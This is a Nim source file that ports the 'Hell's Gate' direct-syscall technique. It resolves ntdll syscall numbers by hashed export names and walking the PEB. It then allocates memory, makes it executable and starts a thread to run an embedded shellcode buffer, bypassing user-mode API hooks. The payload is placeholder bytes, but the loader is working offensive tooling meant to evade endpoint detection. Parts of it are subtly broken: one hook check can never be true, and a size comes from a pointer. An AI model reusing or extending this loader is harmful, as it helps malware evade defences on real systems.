import winim

import ../hash
import ./[stubs]

type
  VX_TABLE_ENTRY* = object
    pAddress*: PVOID
    dwHash*: uint32
    wSystemCall*: WORD
  PVX_TABLE_ENTRY* = ptr VX_TABLE_ENTRY

  VX_TABLE* = object
    NtAllocateVirtualMemory*: VX_TABLE_ENTRY
    NtProtectVirtualMemory*: VX_TABLE_ENTRY
    NtCreateThreadEx*: VX_TABLE_ENTRY
    NtWaitForSingleObject*: VX_TABLE_ENTRY
  PVX_TABLE* = ptr VX_TABLE

proc getPPEB(): winim.PPEB {.asmNoStackFrame, inline.}= 
  asm """
    mov rax, qword ptr gs:[0x60]
    ret
  """

proc getVxTableEntry(pModuleBase: PVOID, pImageExportDirectory: PIMAGE_EXPORT_DIRECTORY, pVxTableEntry: PVX_TABLE_ENTRY): bool =
  var
    pdwAddressOfFunctions = cast[ptr UncheckedArray[DWORD]](cast[int](pModuleBase) + pImageExportDirectory.AddressOfFunctions)
    pdwAddressOfNames = cast[ptr UncheckedArray[DWORD]](cast[int](pModuleBase) + pImageExportDirectory.AddressOfNames)
    pwAddressOfNameOrdinals = cast[ptr UncheckedArray[WORD]](cast[int](pModuleBase) + pImageExportDirectory.AddressOfNameOrdinals)
  
  for i in 0 ..< pImageExportDirectory.NumberOfNames:
    var 
      pczFunctionName = cast[PCHAR](cast[int](pModuleBase) + pdwAddressOfNames[i])
      pFunctionAddress = cast[PBYTE](cast[int](pModuleBase) + pdwAddressOfFunctions[pwAddressOfNameOrdinals[i]])
    if hashStrA(cast[cstring](pczFunctionName)) == pVxTableEntry.dwHash:
      pVxTableEntry.pAddress = pFunctionAddress

      # check if function has been hooked
      var j = 0
      while true:
        # check if syscall, if this case we are too far
        if (cast[PBYTE](cast[int](pFunctionAddress) + j)[] == 0x0f.byte) and (cast[PBYTE](cast[int](pFunctionAddress) + j)[] == 0x05.byte):
          return false
        # check if ret, in this care we are probably too far
        if (cast[PBYTE](cast[int](pFunctionAddress) + j)[] == 0xc3.byte):
          return false

        #[
          First opcodes should be:
            mov r10, rcx
            mov rcx, <syscall>
        ]#
        if (cast[PBYTE](cast[int](pFunctionAddress) + j + 0)[] == 0x4c) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 1)[] == 0x8b) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 2)[] == 0xd1) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 3)[] == 0xb8) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 6)[] == 0x00) and
                (cast[PBYTE](cast[int](pFunctionAddress) + j + 7)[] == 0x00):
          # get high and low bytes and set them in our table
          var 
            h = cast[PBYTE](cast[int](pFunctionAddress) + 5 + j)[]
            l = cast[PBYTE](cast[int](pFunctionAddress) + 4 + j)[]
          pVxTableEntry.wSystemCall = ((h shl 8) or l)
          break
        j.inc
  return true

proc getImageExportDirectory(pModuleBase: PVOID): PIMAGE_EXPORT_DIRECTORY =
  var 
    pImgDosHdr = cast[PIMAGE_DOS_HEADER](pModuleBase)
    pImgNtHdrs = cast[PIMAGE_NT_HEADERS](cast[int](pModuleBase) + pImgDosHdr.e_lfanew)
    pImgExportDirectory = cast[PIMAGE_EXPORT_DIRECTORY](cast[int](pModuleBase) + pImgNtHdrs.OptionalHeader.DataDirectory[0].VirtualAddress)
  if pImgDosHdr.e_magic != IMAGE_DOS_SIGNATURE or pImgNtHdrs.Signature != IMAGE_NT_SIGNATURE:
    return nil
  return pImgExportDirectory


proc initHG*(t: PVX_TABLE): bool = 
  var pPeb = getPPEB()
  # NTDLL module
  var pLdrDataEntry = cast[PLDR_DATA_TABLE_ENTRY](cast[int](pPeb.Ldr.InMemoryOrderModuleList.Flink.Flink) - 0x10)
  # EAT of NTDLL
  var pImageExportDirectory = getImageExportDirectory(pLdrDataEntry.DllBase)
  if cast[int](pImageExportDirectory) == 0:
    return false
  
  t.NtAllocateVirtualMemory.dwHash = static(hashStrA("NtAllocateVirtualMemory"))
  if not getVxTableEntry(pLdrDataEntry.DllBase, pImageExportDirectory, t.NtAllocateVirtualMemory): 
    return false

  t.NtCreateThreadEx.dwHash = static(hashStrA("NtCreateThreadEx"))
  if not getVxTableEntry(pLdrDataEntry.DllBase, pImageExportDirectory, t.NtCreateThreadEx): 
    return false

  t.NtProtectVirtualMemory.dwHash = static(hashStrA("NtProtectVirtualMemory"))
  if not getVxTableEntry(pLdrDataEntry.DllBase, pImageExportDirectory, t.NtProtectVirtualMemory): 
    return false

  t.NtWaitForSingleObject.dwHash = static(hashStrA("NtWaitForSingleObject"))
  if not getVxTableEntry(pLdrDataEntry.DllBase, pImageExportDirectory, t.NtWaitForSingleObject): 
    return false
  
  return true

proc triggerPayload(t: PVX_TABLE): bool =
  var
    sc = "\x90\x90\xcc\x90\x90\x90\xcc\xcc\xcc\xc3\xeb\xef".cstring
    status: NTSTATUS = 0
    lpAddress: LPVOID = NULL
    scLen: SIZE_T = sizeof(sc)
    ulOldProtect: ULONG
  
  # allocate memory for the shellcode
  HellsGate(t.NtAllocateVirtualMemory.wSystemCall)
  status = HellsDescent(cast[HANDLE](-1), lpAddress.addr, 0, &scLen, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if status != 0:
    return false

  # write memory
  copyMem(lpAddress, sc[0].addr, sizeof(sc))

  # change page permissions
  HellsGate(t.NtProtectVirtualMemory.wSystemCall)
  status = HellsDescent(cast[HANDLE](-1), lpAddress.addr, scLen.addr, PAGE_EXECUTE_READ, ulOldProtect.addr)
  if status != 0:
    return false

  # create thread
  var hThread: HANDLE = INVALID_HANDLE_VALUE
  HellsGate(t.NtCreateThreadEx.wSystemCall)
  status = HellsDescent(hThread.addr, 0x1FFFFF, NULL, -1, lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL)
  if status != 0:
    return false

  # wait for X seconds
  var timeout: LARGE_INTEGER
  timeout.QuadPart = -100000
  HellsGate(t.NtWaitForSingleObject.wSystemCall)
  status = HellsDescent(hThread, FALSE, timeout.addr)
  if status != 0:
    return false

  return true

#[ Testing ]#
proc main() =
  var t: VX_TABLE
  if initHG(t):
    discard triggerPayload(t)

when isMainModule:
  main()